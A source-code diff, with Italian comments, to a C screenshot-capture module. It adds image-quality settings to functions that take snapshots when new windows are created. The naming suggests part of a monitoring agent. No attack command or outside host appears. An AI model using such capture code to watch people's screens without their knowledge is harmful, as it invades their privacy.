@@ -7,8 +7,12 @@ typedef struct _snap_param_struct {
 	BOOL on_new_window;
 } snap_param_struct;
 
-BOOL capture_only_window = FALSE;
+#define SNAP_IMG_QUALITY_LOW 0;
+#define SNAP_IMG_QUALITY_MED 50;
+#define SNAP_IMG_QUALITY_HI 100;
 
+BOOL capture_only_window = FALSE;
+DWORD image_quality = SNAP_IMG_QUALITY_MED;
 
 // Hook per la notifica di creazione di nuove finestre
 typedef struct {
@@ -70,7 +74,7 @@ DWORD __stdcall PM_NewWindowDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILE
 DWORD __stdcall PM_SnapShotStartStop(BOOL bStartFlag, BOOL bReset)
 {
 	if (bStartFlag && bReset) 
-		TakeSnapShot(NULL, capture_only_window, PM_SNAPSHOTAGENT, NULL);
+		TakeSnapShot(NULL, capture_only_window, image_quality);
 	return 1;
 }
 
@@ -79,11 +83,13 @@ DWORD __stdcall PM_SnapShotInit(BYTE *conf_ptr, BOOL bStartFlag)
 {
 	snap_param_struct *snap_param = (snap_param_struct *)conf_ptr;
 
-	if (snap_param) 
+	if (snap_param) { 
 		capture_only_window = snap_param->only_window;
-	else 
+		image_quality = SNAP_IMG_QUALITY_MED; // Dovra' prenderla dal file
+	} else {
 		capture_only_window = FALSE;
-
+		image_quality = SNAP_IMG_QUALITY_MED;
+	}
 	PM_SnapShotStartStop(bStartFlag, TRUE);
 	return 1;
 }
